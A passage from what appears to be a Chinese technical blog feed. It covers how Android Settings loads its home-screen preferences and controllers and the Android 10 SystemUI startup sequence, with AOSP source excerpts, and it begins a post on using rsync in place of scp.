class="type">int</span> <span class="title function_">getPreferenceScreenResId</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>最终回调用到子类TopLevelSettings.java的getPreferenceScreenResId()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">getPreferenceScreenResId</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> R.xml.top_level_settings;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此主要是调用androidX Preference的addPreferencesFromResource()方法。此方法主要是将preferenceScreen下所有Preference添加到ArrayList中，然后再根据此集合构建生成PreferenceGroupAdapter，最后将此adapter设置到listview中，完成数据绑定，从而完成界面加载。在这里就要明白mPreferenceControllers是什么，在哪初始化的？<br>我们很快就可以找到：在onAttach()中添加的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> List&lt;AbstractPreferenceController&gt; controllers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// Load preference controllers from code</span></span><br><span class="line"><span class="keyword">final</span> List&lt;AbstractPreferenceController&gt; controllersFromCode =</span><br><span class="line">        createPreferenceControllers(context);</span><br><span class="line"><span class="comment">// Load preference controllers from xml definition</span></span><br><span class="line"><span class="keyword">final</span> List&lt;BasePreferenceController&gt; controllersFromXml = PreferenceControllerListHelper</span><br><span class="line">        .getPreferenceControllersFromXml(context, getPreferenceScreenResId());</span><br><span class="line"><span class="comment">// Filter xml-based controllers in case a similar controller is created from code already.</span></span><br><span class="line"><span class="keyword">final</span> List&lt;BasePreferenceController&gt; uniqueControllerFromXml =</span><br><span class="line">        PreferenceControllerListHelper.filterControllers(</span><br><span class="line">                controllersFromXml, controllersFromCode);</span><br><span class="line"><span class="comment">// Add unique controllers to list.</span></span><br><span class="line"><span class="keyword">if</span> (controllersFromCode != <span class="literal">null</span>) &#123;</span><br><span class="line">    controllers.addAll(controllersFromCode);</span><br><span class="line">&#125;</span><br><span class="line">controllers.addAll(uniqueControllerFromXml);</span><br><span class="line"><span class="comment">// And wire up with lifecycle.</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Lifecycle</span> <span class="variable">lifecycle</span> <span class="operator">=</span> getSettingsLifecycle();</span><br><span class="line">uniqueControllerFromXml</span><br><span class="line">        .stream()</span><br><span class="line">        .filter(controller -&gt; controller <span class="keyword">instanceof</span> LifecycleObserver)</span><br><span class="line">        .forEach(</span><br><span class="line">                controller -&gt; lifecycle.addObserver((LifecycleObserver) controller));</span><br><span class="line">mPlaceholderPreferenceController =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">DashboardTilePlaceholderPreferenceController</span>(context);</span><br><span class="line">controllers.add(mPlaceholderPreferenceController);</span><br><span class="line"><span class="keyword">for</span> (AbstractPreferenceController controller : controllers) &#123;</span><br><span class="line">    addPreferenceController(controller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现：</p><ol><li>从代码中加载preference controllers，调用createPreferenceControllers()方法；</li><li>从xml定义中加载preference controllers，调用getPreferenceControllersFromXml()方法。</li><li>过滤重复定义的controller等，赋值填充mPreferenceControllers。</li></ol><p>再回到displayResourceTiles()方法中的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mPreferenceControllers.values().stream().flatMap(Collection::stream).forEach(</span><br><span class="line">                controller -&gt; controller.displayPreference(screen));</span><br></pre></td></tr></table></figure><p>此语句主要就是调用各个controller的displayPreference()方法。<br>以网络和互联网菜单项为例，xml中配置的controller为”com.android.settings.network.TopLevelNetworkEntryPreferenceController”，查看TopLevelNetworkEntryPreferenceController.java发现，其内并未实现displayPreference()方法，查看继承关系：是继承BasePreferenceController的，接着查看BasePreferenceController中的displayPreference()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Displays preference in this controller.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">displayPreference</span><span class="params">(PreferenceScreen screen)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.displayPreference(screen);</span><br><span class="line">    <span class="keyword">if</span> (getAvailabilityStatus() == DISABLED_DEPENDENT_SETTING) &#123;</span><br><span class="line">        <span class="comment">// Disable preference if it depends on another setting.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Preference</span> <span class="variable">preference</span> <span class="operator">=</span> screen.findPreference(getPreferenceKey());</span><br><span class="line">        <span class="keyword">if</span> (preference != <span class="literal">null</span>) &#123;</span><br><span class="line">            preference.setEnabled(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是调用BasePreferenceController父类AbstractPreferenceController中的displayPreference：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Displays preference in this controller.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">displayPreference</span><span class="params">(PreferenceScreen screen)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefKey</span> <span class="operator">=</span> getPreferenceKey();</span><br><span class="line">    <span class="keyword">if</span> (TextUtils.isEmpty(prefKey)) &#123;</span><br><span class="line">        Log.w(TAG, <span class="string">&quot;Skipping displayPreference because key is empty:&quot;</span> + getClass().getName());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isAvailable()) &#123;</span><br><span class="line">        setVisible(screen, prefKey, <span class="literal">true</span> <span class="comment">/* visible */</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Preference.OnPreferenceChangeListener) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Preference</span> <span class="variable">preference</span> <span class="operator">=</span> screen.findPreference(prefKey);</span><br><span class="line">            preference.setOnPreferenceChangeListener(</span><br><span class="line">                    (Preference.OnPreferenceChangeListener) <span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setVisible(screen, prefKey, <span class="literal">false</span> <span class="comment">/* visible */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>getPreferenceKey()获取preference的key，会调用到子类BasePreferenceController.java的getPreferenceKey()方法：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPreferenceKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mPreferenceKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>而据上面分析到mPreferenceKey实质上即为xml中每个preference配置的android:key属性的值，即此处应为”top_level_network”。（以网络和互联网菜单项为例）</li><li>isAvailable()；判断此preference是否可用即是否应该被显示。如果返回true，则被显示出来，反之则不被显示，最终也会调用到BasePreferenceController.java的isAvailable()方法：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">isAvailable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">availabilityStatus</span> <span class="operator">=</span> getAvailabilityStatus();</span><br><span class="line">    <span class="keyword">return</span> (availabilityStatus == AVAILABLE</span><br><span class="line">            || availabilityStatus == AVAILABLE_UNSEARCHABLE</span><br><span class="line">            || availabilityStatus == DISABLED_DEPENDENT_SETTING);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>注意：看这里的BasePreferenceController.java中的isAvailable()方法中的getAvailabilityStatus()，一直跟进去，会发现调用的是：BasePreferenceController子类TopLevelNetworkEntryPreferenceController.java的getAvailabilityStatus()方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAvailabilityStatus</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Utils.isDemoUser(mContext) ? UNSUPPORTED_ON_DEVICE : AVAILABLE_UNSEARCHABLE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>调用setVisible()方法设置是否可被显示：setVisible(screen, prefKey, true /* visible */);</li></ol><p><strong>frameworks/base/packages/SettingsLib/src/com/android/settingslib/core/AbstractPreferenceController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setVisible</span><span class="params">(PreferenceGroup group, String key, <span class="type">boolean</span> isVisible)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Preference</span> <span class="variable">pref</span> <span class="operator">=</span> group.findPreference(key);</span><br><span class="line">    <span class="keyword">if</span> (pref != <span class="literal">null</span>) &#123;</span><br><span class="line">        pref.setVisible(isVisible);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>判断controller是否实现了Preference.OnPreferenceChangeListener接口，是，则设置监听。<br>综上，如果希望preference不被显示在界面上，可以通过实现相关preference的controller的getAvailabilityStatus()方法，使此方法的返回值不为AVAILABLE、AVAILABLE_UNSEARCHABLE、DISABLED_DEPENDENT_SETTING即可。</li><li>继续看查看BasePreferenceController.java的displayPreference()方法的剩余语句：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (getAvailabilityStatus() == DISABLED_DEPENDENT_SETTING) &#123;</span><br><span class="line">    <span class="comment">// Disable preference if it depends on another setting.</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Preference</span> <span class="variable">preference</span> <span class="operator">=</span> screen.findPreference(getPreferenceKey());</span><br><span class="line">    <span class="keyword">if</span> (preference != <span class="literal">null</span>) &#123;</span><br><span class="line">        preference.setEnabled(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>根据子类controller实现的getAvailabilityStatus()方法的返回值判断是否需要将此preference置为不可点击。<br>至此，DashboardFragment.java中displayResourceTiles()方法分析完成。</li></ol><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol><li>Settings的主Activity实质实现是在SettingsHomepageActivity.java内；</li><li>Settings的主界面设置item的显示是在fragment上，fragment为TopLevelSettings.java，加载显示的布局为top_level_settings.xml；</li><li>Settings主界面设置项item的加载显示主要分为两部分，一部分是xml定义的静态加载，xml为top_level_settings.xml；一部分是DashboardCategory来获取动态加载。</li><li>每个设置项item均为一个preference，通过xml定义加载时，必须要有一个controller，可以是在xml中定义”settings:controller”属性声明，名称必须与类的包名路径相同；也可直接在相关fragment中实现createPreferenceControllers()方法去调用构造相关controller。此二者存其一即可。</li><li>xml中配置preference时，必须定义”android:key“属性；</li><li>需要隐藏不显示某个设置项时，一是可以直接在xml中注释其定义；二是可以在相关设置项preference的controller类中实现getAvailabilityStatus()方法，使此方法的返回值不为AVAILABLE、AVAILABLE_UNSEARCHABLE、DISABLED_DEPENDENT_SETTING即可；</li><li>如果需要某个设置项不可点击，一是可以直接调用setEnabled()。二是可以在相关设置项preference的controller类中实现getAvailabilityStatus()方法，使此方法的返回值为DISABLED_DEPENDENT_SETTING即可。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Settings </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 SystemUI启动流程</title>
      <link href="/2023/11/18/2023-11-18/"/>
      <url>/2023/11/18/2023-11-18/</url>
      
        <content type="html"><![CDATA[<p>1、手机开机后，Android系统首先会创建一个Zygote（核心进程）。<br>2、由Zygote启动SystemServer。<br>3、SystemServer会启动系统运行所需的众多核心服务和普通服务、以及一些应用及数据。例如：SystemUI 启动就是从 SystemServer 里启动的。<br>4、进入锁屏界面，开机完成。</p><p>SystemServer 中有一个 main()方法为系统服务的入口；<br><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The main entry point from zygote.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">SystemServer</span>().run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在SystemServer 中的 main()方法中，就一句代码生成 SystemServer 对象，执行run 方法。在run()方法里启动了各类服务；<br><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">    <span class="comment">// Start services.</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        traceBeginAndSlog(<span class="string">&quot;StartServices&quot;</span>);</span><br><span class="line">        startBootstrapServices();</span><br><span class="line">        startCoreServices();</span><br><span class="line">        startOtherServices();    <span class="comment">// 在该方法里启动了 SystemUI的服务。</span></span><br><span class="line">        SystemServerInitThreadPool.shutdown();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        Slog.e(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;******************************************&quot;</span>);</span><br><span class="line">        Slog.e(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;************ Failure starting system services&quot;</span>, ex);</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        traceEnd();</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startOtherServices</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">    t.traceBegin(<span class="string">&quot;StartSystemUI&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        startSystemUi(context, windowManagerF);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">         reportWtf(<span class="string">&quot;starting System UI&quot;</span>, e);</span><br><span class="line">     &#125;</span><br><span class="line">     t.traceEnd();</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">startSystemUi</span><span class="params">(Context context, WindowManagerService windowManager)</span> &#123;</span><br><span class="line">     <span class="type">PackageManagerInternal</span> <span class="variable">pm</span> <span class="operator">=</span> LocalServices.getService(PackageManagerInternal.class);</span><br><span class="line">     <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">     intent.setComponent(pm.getSystemUiServiceComponent());</span><br><span class="line">     intent.addFlags(Intent.FLAG_DEBUG_TRIAGED_MISSING);</span><br><span class="line">     <span class="comment">//Slog.d(TAG, &quot;Starting service: &quot; + intent);</span></span><br><span class="line">     context.startServiceAsUser(intent, UserHandle.SYSTEM);</span><br><span class="line">     windowManager.onSystemUiStarted();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>SystemServer执行流程图：</p><p><img src="/images/20231118/20231118001.jpg"></p><p>SystemUi进入到SystemUIService的onCreate()方法里；在onCreate()方法中获得 SystemUIApplication 对象并调用其 startServicesIfNeeded() 方法<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/SystemUIService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="built_in">super</span>.onCreate();</span><br><span class="line">     <span class="comment">// Start all of SystemUI</span></span><br><span class="line">     ((SystemUIApplication) getApplication()).startServicesIfNeeded();</span><br><span class="line">    </span><br><span class="line">     <span class="comment">// 省略部分代码...</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Makes sure that all the SystemUI services are running. If they are already running, this is a</span></span><br><span class="line"><span class="comment">  * no-op. This is needed to conditinally start all the services, as we only need to have it in</span></span><br><span class="line"><span class="comment">  * the main process.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;This method must only be called from the main thread.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startServicesIfNeeded</span><span class="params">()</span> &#123;</span><br><span class="line">      String[] names = getResources().getStringArray(R.array.config_systemUIServiceComponents);</span><br><span class="line">      startServicesIfNeeded(names);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在SystemUIApplication中查看startServicesIfNeeded() 方法，其中其中 config_systemUIServiceComponents 值在frameworks/base/packages/SystemUI/res/values/config.xml 里：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/SystemUIApplication.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startServicesIfNeeded</span><span class="params">(String[] services)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mServicesStarted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mServices = <span class="keyword">new</span> <span class="title class_">SystemUI</span>[services.length];</span><br><span class="line">    <span class="keyword">if</span> (!mBootCompleted) &#123;</span><br><span class="line">        <span class="comment">// check to see if maybe it was already completed long before we began</span></span><br><span class="line">        <span class="comment">// see ActivityManagerService.finishBooting()</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;1&quot;</span>.equals(SystemProperties.get(<span class="string">&quot;sys.boot_completed&quot;</span>))) &#123;</span><br><span class="line">            mBootCompleted = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Log.v(TAG, <span class="string">&quot;BOOT_COMPLETED was already sent&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.v(TAG, <span class="string">&quot;Starting SystemUI services for user &quot;</span> +</span><br><span class="line">            Process.myUserHandle().getIdentifier() + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="type">TimingsTraceLog</span> <span class="variable">log</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TimingsTraceLog</span>(<span class="string">&quot;SystemUIBootTiming&quot;</span>,</span><br><span class="line">            Trace.TRACE_TAG_APP);</span><br><span class="line">    log.traceBegin(<span class="string">&quot;StartServices&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> services.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">clsName</span> <span class="operator">=</span> services[i];</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;loading: &quot;</span> + clsName);</span><br><span class="line">        log.traceBegin(<span class="string">&quot;StartServices&quot;</span> + clsName);</span><br><span class="line">        <span class="type">long</span> <span class="variable">ti</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        Class cls;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cls = Class.forName(clsName);</span><br><span class="line">            mServices[i] = (SystemUI) cls.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException ex)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        mServices[i].mContext = <span class="built_in">this</span>;</span><br><span class="line">        mServices[i].mComponents = mComponents;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;running: &quot;</span> + mServices[i]);</span><br><span class="line">        mServices[i].start();</span><br><span class="line">        log.traceEnd();</span><br><span class="line">        <span class="comment">//省略其他代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 startServicesIfNeeded() 循环 start 了config_systemUIServiceComponents 里的 Service，这些服务不是四大组件之一的 Service, 而是继承自 SystemUI 接口的服务，我们称之为 SystemUI服务。<br>到此SystemUI 启动流程分析完毕。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抛弃 scp 改用 rsync，让 Linux 下文件传输高效无比</title>
      <link href="/2023/11/12/2023-11-12/"/>
      <url>/2023/11/12/2023-11-12/</url>
      
        <content type="html"><![CDATA[<p>我们都使用过 scp 来传输文件。当传输在中途或甚至在 99% 时被中断时，（每当我想起99%的中断传输时，我的心都很痛）；让我们看看如何使用 rsync 来替代 scp，避免这样的不幸。</p><h3 id="什么是rsync？"><a href="#什么是rsync？" class="headerlink" title="什么是rsync？"></a>什么是rsync？</h3><p>Rsync 是一个快速且极其灵活的文件复制工具。它可以在本地进行复制，通过任何远程 shell 与另一个主机进行复制，或者通过远程 rsync 守护进程进行复制。它提供许多选项，可以控制其行为的各个方面，并允许对要复制的文件集进行非常灵活的指定。它以增量传输算法而闻名，该算法通过仅发送源文件与目标文件中现有文件之间的差异来减少通过网络发送的数据量。Rsync 广泛用于备份和镜像，作为日常使用的改进复制命令。<br>Rsync 使用”快速检查”算法（默认情况下）来查找需要传输的文件，该算法查找大小或最后修改时间发生变化的文件。当快速检查指示文件的数据不需要更新时，对目标文件直接进行其他保留属性的更改（如选项请求的那样）。</p><h3 id="可用rsync的平台"><a href="#可用rsync的平台" class="headerlink" title="可用rsync的平台"></a>可用rsync的平台</h3><p>Rsync 适用于任何类 UNIX 平台，如 Linux 和 MacOS，也许也有一些针对 Windows 的 rsync 衍生版，但我没有使用过，所以不知道是否存在我们现在讨论的所有功能！</p><h3 id="如何安装rsync"><a href="#如何安装rsync" class="headerlink" title="如何安装rsync"></a>如何安装rsync</h3><p>在 Ubuntu 和 Debian 衍生版中使用 apt 命令进行安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop ~/www.longzhiye.top</span><br><span class="line"> % sudo apt install rsync</span><br></pre></td></tr></table></figure><p>在类似 RedHat 和 Centos 的 RPM 系统中，请使用 yum 命令安装 rsync：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop ~/www.longzhiye.top</span><br><span class="line"> % sudo yum install rsync</span><br></pre></td></tr></table></figure><p>在 Mac 上，请使用 brew 命令安装 rsync：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop ~/www.longzhiye.top</span><br><span class="line"> % brew install rsync</span><br></pre></td></tr></table></figure><p>您可以通过检查其版本来验证是否安装了rsync：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop ~/www.longzhiye.top</span><br><span class="line"> % rsync --version</span><br></pre></td></tr></table></figure><h3 id="如何使用rsync？"><a href="#如何使用rsync？" 